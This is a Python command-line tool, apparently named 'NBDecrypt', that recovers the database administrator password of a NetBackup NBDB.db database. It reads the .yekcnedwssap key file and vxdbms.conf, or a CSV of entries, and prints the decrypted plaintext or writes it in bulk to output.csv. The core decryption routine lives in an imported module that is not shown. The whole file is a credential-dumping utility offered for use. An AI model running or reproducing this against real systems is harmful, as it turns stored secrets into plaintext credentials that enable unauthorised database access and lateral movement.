from decrypt import Decryptor
import argparse
import codecs
import csv

def parse_args():
    parser = argparse.ArgumentParser(
        description="Retrieve DBA pwd of NBDB.db"
    )
    parser.add_argument(
        "-k",
        "--yekcnedwssap",
        help=".yekcnedwssap file path",
        required=True,
    )
    parser.add_argument(
        "-p",
        "--vxdbms",
        help="vxdbms.conf file path or csv file",
        required=True,
    )
    return parser.parse_args()


def massiveDecryption(input_file, output_file, decryptor):
    """
    Decrypts passwords in a CSV file and writes the results to a new file.
    """
    with open(input_file, mode='r', encoding='utf-8') as file_in:
        csv_reader = csv.DictReader(file_in)
        with open(output_file, mode='w', newline='') as file_out:
            fieldnames = csv_reader.fieldnames + ['decryptedPsw']
            csv_writer = csv.DictWriter(file_out, fieldnames=fieldnames)
            csv_writer.writeheader()

            for row in csv_reader:
                decrypted_row = decrypt_password_for_row(row, decryptor)
                csv_writer.writerow(decrypted_row)
    print(f"[+] Massive decryption password completed at: {output_file}")


def decrypt_password_for_row(row, decryptor):
    """
    Decrypts the password for a single row.
    """
    encKey = decryptor.encryptionKey(row["passwordkey"])  # Retrieve encryption key
    decrypted_password = decryptor.decryptPassword(
        row["password"].split(":")[1], 
        codecs.decode(encKey, "hex"), 
        False
    )  # Decrypt DBA password
    row["decryptedPsw"] = decrypted_password
    return row

def decryptPassword(decryptor):
    """
    Decrypts a single encrypted password and prints the result.
    """
    encKey = decryptor.encryptionKey("")  # Retrieve encryption key
    encryptedPsw = decryptor.retrieveEncPsw()  # Retrieve encrypted password
    plaintextPsw = decryptor.decryptPassword(
        encryptedPsw, codecs.decode(encKey, "hex"), True
    )  # Decrypt DBA password
    print(f"[+] Decrypted DBA password: {plaintextPsw}")

def main():

    print('''    _   ______  ____                             __ 
   / | / / __ )/ __ \\___  ____________  ______  / /_
  /  |/ / __  / / / / _ \\/ ___/ ___/ / / / __ \\/ __/
 / /|  / /_/ / /_/ /  __/ /__/ /  / /_/ / /_/ / /_  
/_/ |_/_____/_____/\\___/\\___/_/   \\__, / .___/\\__/  
                                 /____/_/             
    ''')

    args = parse_args()
    decryptor = Decryptor(args.yekcnedwssap, args.vxdbms)

    if decryptor.vxdbmsconf.endswith(".csv"):
        massiveDecryption(decryptor.vxdbmsconf, 'output.csv', decryptor)
    else:
        decryptPassword(decryptor)

if __name__ == "__main__":
    main()

